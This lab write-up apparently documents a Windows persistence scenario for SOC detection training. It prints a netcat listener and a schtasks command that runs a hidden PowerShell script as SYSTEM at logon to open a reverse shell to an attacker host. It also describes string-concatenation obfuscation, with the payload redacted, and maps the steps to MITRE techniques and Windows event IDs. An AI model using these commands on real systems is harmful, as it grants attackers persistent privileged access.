# Persistence via Scheduled Task & Reverse Shell

## Scenario Description

After gaining initial access and escalating privileges on the domain-joined Windows workstation `target-PC.mylab.local`, the attacker established persistence on the compromised system.

To maintain access, the attacker created a scheduled task configured to execute with the highest available privileges under `NT AUTHORITY\SYSTEM`. The task launches a PowerShell script stored in `C:\ProgramData\update.ps1`.

The PowerShell script is constructed using **string concatenation**, where the payload is divided into multiple string variables and then reconstructed before being written to disk. This technique can make static analysis and signature-based detection more difficult.

The scheduled task is configured to execute **at user logon**, allowing the attacker to regain access whenever a user logs into the compromised workstation.

## MITRE ATT&CK Mapping

* **Tactics:** Persistence, Privilege Escalation, Defense Evasion
* **Technique:** Scheduled Task/Job: Scheduled Task — [T1053.005](https://attack.mitre.org/techniques/T1053/005/)
* **Command and Scripting Interpreter: PowerShell — T1059.001:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)
* **Obfuscated/Compressed Files and Information — T1027:** [T1027](https://attack.mitre.org/techniques/T1027/)

## Execution Steps

### Listener Setup — Kali Linux

A listener was configured on the Kali attacker machine to receive the outbound connection from the compromised Windows endpoint:

```bash
nc -lvnp 4444
```

### PowerShell Script Creation

A PowerShell script was created on the compromised endpoint and stored in the `C:\ProgramData` directory.

Instead of storing the complete payload as a single string, the script was divided into multiple parts and reconstructed using string concatenation:

```powershell
$ScriptPath = "C:\ProgramData\update.ps1"

$part1 = '<payload-part-1>'
$part2 = '<payload-part-2>'
$part3 = '<payload-part-3>'
$part4 = '<payload-part-4>'
$part5 = '<payload-part-5>'

$fullCode = $part1 + $part2 + $part3 + $part4 + $part5

[System.IO.File]::WriteAllText($ScriptPath, $fullCode)
```

The script was stored under a benign-looking filename and location:

```text
C:\ProgramData\update.ps1
```

The use of multiple variables allowed the final PowerShell code to be reconstructed only after the individual strings were concatenated.

### Scheduled Task Creation

The attacker created a scheduled task named `UpdateTask` using `schtasks.exe`.

The task was configured to execute **at user logon** under the `SYSTEM` account:

```powershell
schtasks /create /tn "UpdateTask" /tr "powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /f
```

The configuration provided persistence by causing the PowerShell script to execute whenever a user logs on to the compromised workstation while also causing the PowerShell process to execute with `SYSTEM` privileges.

### Task Execution and Verification

The scheduled task was manually triggered to validate the configuration:

```powershell
schtasks /run /tn "UpdateTask"
```

The resulting outbound connection was received by the Kali listener on port `4444`.

The resulting process was verified as running under:

```text
NT AUTHORITY\SYSTEM
```

This confirmed that the scheduled task successfully executed the PowerShell payload with elevated privileges.

## Windows Event Telemetry

The activity generated several relevant Windows and Sysmon events that can be used during the SOC investigation:

| Event ID            | Log Provider                | Description / Artefact                                            |
| ------------------- | --------------------------- | ----------------------------------------------------------------- |
| **4698**            | Security                    | Scheduled task created (`Task Name: \UpdateTask`)                 |
| **106**             | TaskScheduler / Operational | Scheduled task registered                                         |
| **4688 / Sysmon 1** | Security / Sysmon           | Process creation involving `powershell.exe` and `update.ps1`      |
| **Sysmon 3**        | Sysmon / Operational        | Network connection from `powershell.exe` to `192.168.10.133:4444` |

Additional telemetry may also reveal the creation of `update.ps1` and the execution of PowerShell from `C:\ProgramData`.

## Result

The attacker successfully established persistence through a scheduled task configured to execute a PowerShell payload under the `SYSTEM` account.

The PowerShell payload was constructed through **string concatenation**, with multiple individual strings combined to produce the final script.

The resulting attack chain was:

```text
Compromised Windows Endpoint
        ↓
Privilege Escalation
        ↓
PowerShell Script Created
        ↓
Payload Split into Multiple Strings
        ↓
String Concatenation
        ↓
update.ps1 Written to C:\ProgramData
        ↓
UpdateTask Created
        ↓
SYSTEM Execution
        ↓
User Logon Trigger
        ↓
PowerShell Execution
        ↓
Outbound Connection to Kali
        ↓
SYSTEM Shell
```

This scenario demonstrates how scheduled tasks can be abused to establish persistence and execute PowerShell payloads with elevated privileges, while string concatenation can be used to make static analysis more difficult.

The activity generates multiple telemetry sources that can be investigated through **Microsoft Defender for Endpoint, Microsoft Defender XDR, Sysmon, and Microsoft Sentinel**.
